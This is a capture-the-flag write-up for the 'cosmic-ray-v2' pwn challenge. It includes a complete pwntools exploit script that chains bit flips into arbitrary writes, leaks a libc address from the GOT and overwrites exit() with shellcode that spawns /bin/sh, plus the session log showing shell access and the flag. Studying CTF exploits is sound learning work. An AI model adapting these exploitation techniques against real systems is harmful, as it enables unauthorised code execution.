# cosmic-ray-v2

not too difficult pwn chall

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/a23972c7-48e0-4ee8-9ab2-7991f32a26e4)

see [cosmic-ray-v2.zip](./cosmic-ray-v2.zip)

## solution

```console
quasar@quasar098:~/Warehouse/cosmic-ray-v2$ checksec cosmicrayv2
[*] '/mnt/c/Users/Lav Patel/IdeaProjects/pwnstuff/cosmic-ray-v2/cosmicrayv2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

this is a sequel to the original cosmic-ray challenge in sekai ctf, which i wasn't able to complete

the difference this time is that there is no win function

the way that this program works is that it opens it's own /proc/<pid>/mem to flip one bit of data, just like a cosmic ray would

the first step here is to get multiple bit flips, because one on it's own doesn't do much.

to do that, we can flip the jmp instruction to go back to the main function because it is called at the end of the cosmic_ray function.

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/d1b117ce-73a5-4b38-8bdf-b437a0bf82fd)

notably, we modify the `0x4015e2` byte (`05` originally), to be `0D` by flipping the 4th bit from the right (xor with `00001000`). thanks to 0xM4hm0ud for figuring that one out, i would not have been able to find it

this brings us back to the start of the main function after each cosmic ray bit flip, allowing multiple bit flips, or arbitrary memory overwrites

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/e58e17e2-2102-4440-9d61-521da59ea392)

```py
from pwn import *

p = remote("vsc.tf", 3047)
# p = process(["./cosmicrayv2"])
# p = gdb.debug(["./cosmicrayv2"], gdbscript="break *0x4011a4\nc\n")

libc = ELF("./libc-2.35.so")
# libc = ELF("./local-libc.so")

p.sendlineafter(b'through:\n', b'0x4015e2')
p.sendlineafter(b':\n', b'4')
```

the next step is to leak the libc address by flipping any bit of any GOT function twice, causing no change, but reading a byte.

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7fc5afa1-d23d-4763-a2bb-391ea61118f3)

```py
exit_addr = 0
exit_got_addr = 0x403fe8

# leak libc address
for _ in range(8):
    p.sendline(f'{hex(exit_got_addr + _)}'.encode('ascii'))
    p.sendline(b'0')
    p.sendline(f'{hex(exit_got_addr + _)}'.encode('ascii'))
    p.sendline(b'0')

    p.recvuntil(b'-----------------\n')
    n = int(p.recvline().decode('ascii').replace("|", ''), 2)
    p.recvuntil(b'-----------------\n')
    exit_addr = exit_addr | (n << 8 * _)
```

here i chose the exit() function because it is only called when the bit we want to change not between 0 and 7 inclusive, meaning we can trigger exit(1) whenever we want.
this is important later.

once i have the exit address on libc, we can use libc offsets to get the address of the system function in libc, as well as the address of the `/bin/sh` string in libc

```py
bin_sh_addr = exit_addr - libc.symbols['exit'] + 0x1d8698
system_addr = exit_addr - libc.symbols['exit'] + libc.symbols['system']
```

the next step is to overwrite the exit() function in libc with shellcode to jump to system. i couldn't get a raw shellcode working, so this is the next best thing

```py
def write_byte(loc: int, byte2: int):
    p.sendline(hex(loc).encode('ascii'))
    p.recvuntil(b'-----------------\n')
    og = int(p.recvline().decode('ascii').replace("|", ''), 2)
    p.sendline(b'0')
    p.sendline(hex(loc).encode('ascii'))
    p.recvuntil(b'-----------------\n')
    p.sendline(b'0')
    need_xor = og ^ byte2
    print(bin(og), bin(byte2), bin(need_xor))
    index = 0
    while need_xor:
        if need_xor & 1:
            p.sendline(hex(loc).encode('ascii'))
            p.sendline(str(7-index).encode('ascii'))
            p.recvuntil(b'-----------------\n')
        need_xor = need_xor >> 1
        index += 1
```

above is as function i made to overwrite a byte by seeing what bits need to be flipped to get a desired result

also, one of the worst things about this challenge was that choosing the `0` bit in the program meant modifying the most significant bit of the byte, which messed me up because i thought it was the 7th (`2**7` -> 128)

```py
code = b'\x48\xbf' + p64(bin_sh_addr) + b'\xe9' + p32(system_addr-exit_addr-0xf)
for index, byte in enumerate(code):
    write_byte(exit_addr+index, byte)

print(hex(bin_sh_addr), hex(system_addr), hex(exit_addr), hex(system_addr-exit_addr))

p.sendline(b'0x403fa8')
p.sendline(b'8')

p.interactive()
```

i asked jat gpt to write this shellcode for me because believe it or not it is surprisingly difficult to find an accurate assembly to byte table online because most are incorrect or for a different cpu or architecture or something idk.

after that, i change a random address with an invalid bit, triggering the exit(1)

anyways, the code that overwrites exit(1) moves the address of the string `/bin/sh` in libc to the register `rdi`, which is the first argument register

then, i jump the amount of bytes required to get to the system function in libc. then, i have a shell

```console
quasar@quasar098:~/Warehouse/cosmic-ray-v2$ python3 solve.py
[+] Opening connection to vsc.tf on port 3047: Done
[*] '/mnt/c/Users/Lav Patel/IdeaProjects/pwnstuff/cosmic-ray-v2/libc-2.35.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
0b11110011 0b1001000 0b10111011
0b1111 0b10111111 0b10110000
0b11110 0b10011000 0b10000110
0b11111010 0b1100110 0b10011100
0b1010000 0b1110 0b1011110
0b1011000 0b10010001 0b11001001
0b10111001 0b11000110 0b1111111
0b1 0b1111111 0b1111110
0b0 0b0 0b0
0b0 0b0 0b0
0b0 0b11101001 0b11101001
0b10111010 0b1100001 0b11011011
0b1 0b10110111 0b10110110
0b0 0b0 0b0
0b0 0b0 0b0
0x7fc6910e6698 0x7fc690f5ed60 0x7fc690f535f0 0xb770
[*] Switching to interactive mode
|1|0|0|0|0|0|0|0|

Enter the bit position to flip:

Bit succesfully flipped! New value is 0

Enter an address to send a cosmic ray through:

|0|1|2|3|4|5|6|7|
-----------------
|0|0|1|0|0|0|0|0|

Enter the bit position to flip:
$ ls
cosmicrayv2
flag.txt
ld-2.35.so
libc-2.35.so
$ cat flag.txt
vsctf{m3_wh3n_c0mp1l1ng_w1th_c4n4ry_1s_m0r3_vuln3r4bl3_th4n_c0mp1l1ng_w1th0ut}
$ ^C
[*] Interrupted
[*] Closed connection to vsc.tf port 3047
```
